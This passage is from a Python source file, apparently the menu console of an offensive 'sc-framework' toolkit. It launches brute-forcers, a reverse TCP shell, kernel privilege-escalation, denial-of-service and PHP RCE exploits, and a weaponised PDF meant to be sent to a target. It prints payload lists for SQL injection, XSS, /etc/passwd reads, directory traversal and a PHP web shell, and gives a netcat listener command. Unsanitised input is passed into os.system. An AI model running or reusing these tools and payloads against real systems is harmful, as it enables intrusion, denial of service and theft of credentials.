""")
        mexploitsshlogintest()
    elif scconsole37 == "run":
        os.system('python exploits/multi/ssh-login-test.py')
        mexploitsshlogintest()
    elif scconsole37 == "exploit":
        os.system('python exploits/multi/ssh-login-test.py')
        mexploitsshlogintest()
    elif scconsole37 == "unuse":
        print("unusing multi/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole37 == "exit":
        exit()

def mexploitftplogintest():
    scconsole38 = input("sc~" + color.red + "(multi/ftp-login-test)" + color.white + ">")
    if scconsole38 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mexploitftplogintest()
    elif scconsole38 == "clear":
        os.system('clear')
        mexploitftplogintest()
    elif scconsole38 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        mexploitftplogintest()
    elif scconsole38 == "run":
        os.system('python exploits/multi/ftp-login-test.py')
        mexploitftplogintest()
    elif scconsole38 == "exploit":
        os.system('python exploits/multi/ftp-login-test.py')
        mexploitftplogintest()
    elif scconsole38 == "unuse":
        print("unusing multi/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole38 == "exit":
        exit()

def mexploitreverseshell():
    scconsole39 = input("sc~" + color.red + "(multi/shell_reverse_tcp)" + color.white + ">")
    if scconsole39 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mexploitreverseshell()
    elif scconsole39 == "clear":
        os.system('clear')
        mexploitreverseshell()
    elif scconsole39 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify your ip address.
LPORT            | specify your port.

you will specifiy these options when you run or exploit it!
""")
        mexploitreverseshell()
    elif scconsole39 == "run":
        os.system('python exploits/multi/shell_reverse_tcp.py')
        mexploitreverseshell()
    elif scconsole39 == "exploit":
        os.system('python exploits/multi/shell_reverse_tcp.py')
        mexploitreverseshell()
    elif scconsole39 == "unuse":
        print("unusing multi/shell_reverse_tcp.")
        time.sleep(0.5)
        Console()
    elif scconsole39 == "exit":
        exit()

def osxkernelxnuipfragmentprivesc():
    scconsole40 = input("sc~" + color.red + "(osx/kernel_xnu_ip_fragment_privesc)" + color.white + ">")
    if scconsole40 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "clear":
        os.system('clear')
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "run":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc.py')
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "exploit":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc.py')
        osxkernelxnuipfragmentprivesc()
    elif scconsole40 == "unuse":
        print("unusing osx/kernel_xnu_ip_fragment_privesc.")
        time.sleep(0.5)
        Console()
    elif scconsole40 == "exit":
        exit()
    
def osxkernelxnuipfragmentprivesc2():
    scconsole41 = input("sc~" + color.red + "(osx/kernel_xnu_ip_fragment_privesc_2)" + color.white + ">")
    if scconsole41 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "clear":
        os.system('clear')
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "run":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc_2.py')
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "exploit":
        os.system('python exploits/osx/kernel_xnu_ip_fragment_privesc_2.py')
        osxkernelxnuipfragmentprivesc2()
    elif scconsole41 == "unuse":
        print("unusing osx/kernel_xnu_ip_fragment_privesc_2.")
        time.sleep(0.5)
        Console()
    elif scconsole41 == "exit":
        exit()

def oexploitsshlogintest():
    scconsole42 = input("sc~" + color.red + "(osx/ssh-login-test)" + color.white + ">")
    if scconsole42 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        oexploitsshlogintest()
    elif scconsole42 == "clear":
        os.system('clear')
        oexploitsshlogintest()
    elif scconsole42 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
RPORT         | specified as 22. (ssh port).
PASSLIST      | specify the password list path.
USERNAMELIST  | specify the username list path.

you will specifiy these options when you run or exploit it!
""")
        oexploitsshlogintest()
    elif scconsole42 == "run":
        os.system('python exploits/osx/ssh-login-test.py')
        oexploitsshlogintest()
    elif scconsole42 == "exploit":
        os.system('python exploits/osx/ssh-login-test.py')
        oexploitsshlogintest()
    elif scconsole42 == "unuse":
        print("unusing osx/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole42 == "exit":
        exit()

def oexploitftplogintest():
    scconsole43 = input("sc~" + color.red + "(osx/ftp-login-test)" + color.white + ">")
    if scconsole43 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        oexploitftplogintest()
    elif scconsole43 == "clear":
        os.system('clear')
        oexploitftplogintest()
    elif scconsole43 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        oexploitftplogintest()
    elif scconsole43 == "run":
        os.system('python exploits/osx/ftp-login-test.py')
        oexploitftplogintest()
    elif scconsole43 == "exploit":
        os.system('python exploits/osx/ftp-login-test.py')
        oexploitftplogintest()
    elif scconsole43 == "unuse":
        print("unusing osx/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole43 == "exit":
        exit()

def lexploitsshlogintest():
    scconsole44 = input("sc~" + color.red + "(linux/ssh-login-test)" + color.white + ">")
    if scconsole44 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        lexploitsshlogintest()
    elif scconsole44 == "clear":
        os.system('clear')
        lexploitsshlogintest()
    elif scconsole44 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
RPORT         | specified as 22. (ssh port).
PASSLIST      | specify the password list path.
USERNAMELIST  | specify the username list path.

you will specifiy these options when you run or exploit it!
""")
        lexploitsshlogintest()
    elif scconsole44 == "run":
        os.system('python exploits/linux/ssh-login-test.py')
        lexploitsshlogintest()
    elif scconsole44 == "exploit":
        os.system('python exploits/linux/ssh-login-test.py')
        lexploitsshlogintest()
    elif scconsole44 == "unuse":
        print("unusing linux/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole44 == "exit":
        exit()

def lexploitftplogintest():
    scconsole45 = input("sc~" + color.red + "(linux/ftp-login-test)" + color.white + ">")
    if scconsole45 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        lexploitftplogintest()
    elif scconsole45 == "clear":
        os.system('clear')
        lexploitftplogintest()
    elif scconsole45 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        lexploitftplogintest()
    elif scconsole45 == "run":
        os.system('python exploits/linux/ftp-login-test.py')
        lexploitftplogintest()
    elif scconsole45 == "exploit":
        os.system('python exploits/linux/ftp-login-test.py')
        lexploitftplogintest()
    elif scconsole45 == "unuse":
        print("unusing linux/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole45 == "exit":
        exit()

def treversehttp():
    scconsole46 = input("sc~" + color.red + "(site/reverse_http)" + color.white + ">")
    if scconsole46 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        treversehttp()
    elif scconsole46 == "clear":
        os.system('clear')
        treversehttp()
    elif scconsole46 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        treversehttp()
    elif scconsole46 == "run":
        os.system('python exploits/site/reverse_http.py')
        treversehttp()
    elif scconsole46 == "exploit":
        os.system('python exploits/site/reverse_http.py')
        treversehttp()
    elif scconsole46 == "unuse":
        print("unusing site/reverse_http.")
        time.sleep(0.5)
        Console()
    elif scconsole46 == "exit":
        exit()

def sserverbrowserautopwn2():
    scconsole47 = input("sc~" + color.red + "(server/browser_autopwn2)" + color.white + ">")
    if scconsole47 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        sserverbrowserautopwn2()
    elif scconsole47 == "clear":
        os.system('clear')
        sserverbrowserautopwn2()
    elif scconsole47 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target URL.
PAYLOAD          | specify the payload you want.
PHISHING URL     | specify the phishing url.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        sserverbrowserautopwn2()
    elif scconsole47 == "show payloads":
        print("""
<script>alert('XSS')</script>  ---> cross site XSS alert payload.

<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.

<a href=javascript:alert('XSS')>Click Me</a>  ---> cross site XSS Click Me payload.

javascript:alert('XSS')  ---> cross site XSS javascript payload.
""")
        sserverbrowserautopwn2()
    elif scconsole47 == "run":
        targetsite = input("URL: ")
        payload10 = input("PAYLOAD: ")
        phishingurl = input("PHISHING URL: ")
        os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite} -p "{payload10}" -ph {phishingurl}')
        sserverbrowserautopwn2()
    elif scconsole47 == "exploit":
        targetsite2 = input("URL: ")
        payload101 = input("PAYLOAD: ")
        phishingurl2 = input("PHISHING URL: ")
        os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite2} -p "{payload101}" -ph {phishingurl2}')
        sserverbrowserautopwn2()
    elif scconsole47 == "unuse":
        print("unusing server/browser_autopwn2.")
        time.sleep(0.5)
        Console()
    elif scconsole47 == "exit":
        exit()

def sserverextracttabledbcolumn():
    scconsole48 = input("sc~" + color.red + "(server/extract_table_db_column)" + color.white + ">")
    if scconsole48 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        sserverextracttabledbcolumn()
    elif scconsole48 == "clear":
        os.system('clear')
        sserverextracttabledbcolumn()
    elif scconsole48 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target URL.
PAYLOAD          | specify the payload(you don't need to specifiy it uses own payloads!).

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        sserverextracttabledbcolumn()
    elif scconsole48 == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.

""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.

""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.

""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.

""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.

""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.

""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
""")
        sserverextracttabledbcolumn()
    elif scconsole48 == "run":
        os.system(f'python exploits/server/extract_table_db_column.py')
        sserverextracttabledbcolumn()
    elif scconsole48 == "exploit":
        os.system(f'python exploits/server/extract_table_db_column.py')
        sserverextracttabledbcolumn()
    elif scconsole48 == "unuse":
        print("unusing server/extract_table_db_column.")
        time.sleep(0.5)
        Console()
    elif scconsole48 == "exit":
        exit()

def lexploitvulnerabilityfind():
    scconsole49 = input("sc~" + color.red + "(linux/vulnerability-find)" + color.white + ">")
    if scconsole49 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        lexploitvulnerabilityfind()
    elif scconsole49 == "clear":
        os.system('clear')
        lexploitvulnerabilityfind()
    elif scconsole49 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        lexploitvulnerabilityfind()
    elif scconsole49 == "run":
        os.system('python exploits/linux/vulnerability-find.py')
        lexploitvulnerabilityfind()
    elif scconsole49 == "exploit":
        os.system('python exploits/linux/vulnerability-find.py')
        lexploitvulnerabilityfind()
    elif scconsole49 == "unuse":
        print("unusing linux/vulnerability-find.")
        time.sleep(0.5)
        Console()
    elif scconsole49 == "exit":
        exit()

def tcve202224521():
    scconsole50 = input("sc~" + color.red + "(site/cve-2022-24521)" + color.white + ">")
    if scconsole50 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tcve202224521()
    elif scconsole50 == "clear":
        os.system('clear')
        tcve202224521()
    elif scconsole50 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address(website IP Address).
LHOST            | specify the listening host.
LPORT            | specify yhe listening port.

run this command in another terminal after specifiying the options ---> """ + color.green + """nc -lvnp <port>""" + color.white + """
you will specifiy these options when you run or exploit it!
""")
        tcve202224521()
    elif scconsole50 == "run":
        rhost4 = input("RHOST: ")
        lhost4 = input("LHOST: ")
        lport4 = input("LPORT: ")
        os.system(f'python exploits/site/cve-2022-24521.py {rhost4} {lhost4} {lport4}')
        tcve202224521()
    elif scconsole50 == "exploit":
        rhost5 = input("RHOST: ")
        lhost5 = input("LHOST: ")
        lport5 = input("LPORT: ")
        os.system(f'python exploits/site/cve-2022-24521.py {rhost5} {lhost5} {lhost5}')
        tcve202224521()
    elif scconsole50 == "unuse":
        print("unusing site/cve-2022-24521.")
        time.sleep(0.5)
        Console()
    elif scconsole50 == "exit":
        exit()

def tinformationgather():
    scconsole51 = input("sc~" + color.red + "(site/information-gather)" + color.white + ">")
    if scconsole51 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tinformationgather()
    elif scconsole51 == "clear":
        os.system('clear')
        tinformationgather()
    elif scconsole51 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        tinformationgather()
    elif scconsole51 == "run":
        os.system('python exploits/site/information-gather.py')
        tinformationgather()
    elif scconsole51 == "exploit":
        os.system('python exploits/site/information-gather.py')
        tinformationgather()
    elif scconsole51 == "unuse":
        print("unusing site/information-gather.")
        time.sleep(0.5)
        Console()
    elif scconsole51 == "exit":
        exit()

def tportscan():
    scconsole52 = input("sc~" + color.red + "(site/port-scan)" + color.white + ">")
    if scconsole52 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tportscan()
    elif scconsole52 == "clear":
        os.system('clear')
        tportscan()
    elif scconsole52 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
START_PORT       | specify the starting port.
END_PORT         | specify the ending port.

you will specifiy these options when you run or exploit it!
""")
        tportscan()
    elif scconsole52 == "run":
        os.system('python exploits/site/port-scan.py')
        tportscan()
    elif scconsole52 == "exploit":
        os.system('python exploits/site/port-scan.py')
        tportscan()
    elif scconsole52 == "unuse":
        print("unusing site/port-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole52 == "exit":
        exit()

def dciscodos():
    scconsole53 = input("sc~" + color.red + "(dos/ciscodos)" + color.white + ">")
    if scconsole53 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        dciscodos()
    elif scconsole53 == "clear":
        os.system('clear')
        dciscodos()
    elif scconsole53 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address (Cisco IOS software router IP - Internetwork Operating System).
TTL              | specify the ttl (Time-to-Live).

you will specifiy these options when you run or exploit it!
""")
        dciscodos()
    elif scconsole53 == "run":
        routerip = input("IP: ")
        ttl = int(input("TTL: "))
        os.system(f'./exploits/dos/ciscodos.sh {routerip} {ttl}')
        dciscodos()
    elif scconsole53 == "exploit":
        routerip2 = input("IP: ")
        ttl2 = int(input("TTL: "))
        os.system(f'./exploits/dos/ciscodos.sh {routerip2} {ttl2}')
        dciscodos()
    elif scconsole53 == "unuse":
        print("unusing dos/ciscodos.sh.")
        time.sleep(0.5)
        Console()
    elif scconsole53 == "exit":
        exit()

def wMS04007LSASSexeProRemoteDoS():
    scconsole54 = input("sc~" + color.red + "(windows/MS04-007_LSASS-exe_Pro_Remote_DoS)" + color.white + ">")
    if scconsole54 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "clear":
        os.system('clear')
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
RPORT            | specify the port.
NETBIOS          | specify the netbios.

you will specifiy these options when you run or exploit it!
""")
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "run":
        lhost54 = input("LHOST: ")
        lport54 = int(input("LPORT: "))
        netbios54 = input("NETBIOS: ")
        os.system(f'./exploits/windows/MS04-007_LSASS-exe_Pro_Remote_DoS {lhost54} {lport54} {netbios54}')
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "exploit":
        lhost55 = input("LHOST: ")
        lport55 = int(input("LPORT: "))
        netbios55 = input("NETBIOS: ")
        os.system(f'./exploits/windows/MS04-007_LSASS-exe_Pro_Remote_DoS {lhost55} {lport55} {netbios55}')
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole54 == "unuse":
        print("unusing windows/MS04-007_LSASS-exe_Pro_Remote_DoS.")
        time.sleep(0.5)
        Console()
    elif scconsole54 == "exit":
        exit()

def ltcpdumppacketsniffer():
    scconsole55 = input("sc~" + color.red + "(linux/tcpdump_packet_sniffer)" + color.white + ">")
    if scconsole55 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        ltcpdumppacketsniffer()
    elif scconsole55 == "clear":
        os.system('clear')
        ltcpdumppacketsniffer()
    elif scconsole55 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        ltcpdumppacketsniffer()
    elif scconsole55 == "run":
        lhost56 = input("LHOST: ")
        os.system(f'./exploits/linux/tcpdump_packet_sniffer {lhost56}')
        ltcpdumppacketsniffer()
    elif scconsole55 == "exploit":
        lhost57 = input("LHOST: ")
        os.system(f'./exploits/linux/tcpdump_packet_sniffer {lhost57}')
        ltcpdumppacketsniffer()
    elif scconsole55 == "unuse":
        print("unusing linux/tcpdump_packet_sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole55 == "exit":
        exit()

def pRCEviaPHP():
    scconsole56 = input("sc~" + color.red + "(php/RCE_via_PHP)" + color.white + ">")
    if scconsole56 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        pRCEviaPHP()
    elif scconsole56 == "clear":
        os.system('clear')
        pRCEviaPHP()
    elif scconsole56 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address (website).
RPORT         | specify the port.
COMMAND       | specify the command you want.

you will specifiy these options when you run or exploit it!
""")
        pRCEviaPHP()
    elif scconsole56 == "run":
        os.system('php exploits/php/RCE_via_PHP.php')
        pRCEviaPHP()
    elif scconsole56 == "exploit":
        os.system('php exploits/php/RCE_via_PHP.php')
        pRCEviaPHP()
    elif scconsole56 == "unuse":
        print("unusing php/RCE_via_PHP.")
        time.sleep(0.5)
        Console()
    elif scconsole56 == "exit":
        exit()

def pSOPlanning15201RCE():
    scconsole57 = input("sc~" + color.red + "(php/SOPlanning_1-52-01_RCE)" + color.white + ">")
    if scconsole57 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        pSOPlanning15201RCE()
    elif scconsole57 == "clear":
        os.system('clear')
        pSOPlanning15201RCE()
    elif scconsole57 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url (with port, example: https://example.com:9090).
USERNAME      | specify the username.
PASSWORD      | specify the password.

you will specifiy these options when you run or exploit it!
""")
        pSOPlanning15201RCE()
    elif scconsole57 == "run":
        url57 = input("URL: ")
        username57 = input("USERNAME: ")
        password57 = input("PASSWORD: ")
        os.system(f'python exploits/php/SOPlanning_1-52-01_RCE.py -t {url57} -u {username57} -p {password57}')
        pSOPlanning15201RCE()
    elif scconsole57 == "exploit":
        url58 = input("URL: ")
        username58 = input("USERNAME: ")
        password58 = input("PASSWORD: ")
        os.system(f'python exploits/php/SOPlanning_1-52-01_RCE.py -t {url58} -u {username58} -p {password58}')
        pSOPlanning15201RCE()
    elif scconsole57 == "unuse":
        print("unusing php/SOPlanning_1-52-01_RCE.")
        time.sleep(0.5)
        Console()
    elif scconsole57 == "exit":
        exit()

def mTyporav174():
    scconsole58 = input("sc~" + color.red + "(multi/Typora_v1-7-4)" + color.white + ">")
    if scconsole58 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mTyporav174()
    elif scconsole58 == "clear":
        os.system('clear')
        mTyporav174()
    elif scconsole58 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify your ip address.
LPORT            | specify your port.
PDF              | specify the PDF name.

The PDF file exploit will save in : /sc_framework/exploits/multi/[pdfname].pdf .

After Thats creates, Send the  PDF to your target!
you will specifiy these options when you run or exploit it!
""")
        mTyporav174()
    elif scconsole58 == "run":
        os.system('python exploits/multi/Typora_v1-7-4.py')
        mTyporav174()
    elif scconsole58 == "exploit":
        os.system('python exploits/multi/Typora_v1-7-4.py')
        mTyporav174()
    elif scconsole58 == "unuse":
        print("unusing multi/Typora_v1-7-4.")
        time.sleep(0.5)
        Console()
    elif scconsole58 == "exit":
        exit()

def pWp2Fac():
    scconsole59 = input("sc~" + color.red + "(php/Wp2Fac)" + color.white + ">")
    if scconsole59 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        pWp2Fac()
    elif scconsole59 == "clear":
        os.system('clear')
        pWp2Fac()
    elif scconsole59 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address (website).
R-S-COMMAND   | specify the reverse-shell-command you want.

you will specifiy these options when you run or exploit it!
""")
        pWp2Fac()
    elif scconsole59 == "run":
        os.system('python exploits/php/Wp2Fac.py')
        pWp2Fac()
    elif scconsole59 == "exploit":
        os.system('python exploits/php/Wp2Fac.py')
        pWp2Fac()
    elif scconsole59 == "unuse":
        print("unusing php/Wp2Fac.")
        time.sleep(0.5)
        Console()
    elif scconsole59 == "exit":
        exit()

def mosdetector():
    scconsole60 = input("sc~" + color.red + "(multi/os_detector)" + color.white + ">")
    if scconsole60 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mosdetector()
    elif scconsole60 == "clear":
        os.system('clear')
        mosdetector()
    elif scconsole60 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify target ip address.
PORT             | specify the port to start detecting.

you will specifiy these options when you run or exploit it!
""")
        mosdetector()
    elif scconsole60 == "run":
        targetip60 = input("LHOST: ")
        targetport60 = int(input("LPORT: "))
        os.system(f'sudo python exploits/multi/os_detector.py {targetip60} {targetport60}')
        mosdetector()
    elif scconsole60 == "exploit":
        targetip61 = input("LHOST: ")
        targetport61 = int(input("LPORT: "))
        os.system(f'sudo python exploits/multi/os_detector.py {targetip61} {targetport61}')
        mosdetector()
    elif scconsole60 == "unuse":
        print("unusing multi/os_detector.")
        time.sleep(0.5)
        Console()
    elif scconsole60 == "exit":
        exit()

def mpop3pass():
    scconsole61 = input("sc~" + color.red + "(multi/pop3-pass)" + color.white + ">")
    if scconsole61 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mpop3pass()
    elif scconsole61 == "clear":
        os.system('clear')
        mpop3pass()
    elif scconsole61 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
LPORT         | specified as 110 (pop3 port).

you will specifiy these options when you run or exploit it!
""")
        mpop3pass()
    elif scconsole61 == "run":
        os.system('python exploits/multi/pop3-pass.py')
        mpop3pass()
    elif scconsole61 == "exploit":
        os.system('python exploits/multi/pop3-pass.py')
        mpop3pass()
    elif scconsole61 == "unuse":
        print("unusing multi/pop3-pass.")
        time.sleep(0.5)
        Console()
    elif scconsole61 == "exit":
        exit()

def mpop3bruteforce():
    scconsole62 = input("sc~" + color.red + "(multi/pop3-brute-force)" + color.white + ">")
    if scconsole62 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mpop3bruteforce()
    elif scconsole62 == "clear":
        os.system('clear')
        mpop3bruteforce()
    elif scconsole62 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
PORT          | specified as 110 (pop3 port).
USERNAMELIST  | specify the username list path.
PASSWORDLIST  | specify the password list path.

you will specifiy these options when you run or exploit it!
""")
        mpop3bruteforce()
    elif scconsole62 == "run":
        os.system('python exploits/multi/pop3-brute-force.py')
        mpop3bruteforce()
    elif scconsole62 == "exploit":
        os.system('python exploits/multi/pop3-brute-force.py')
        mpop3bruteforce()
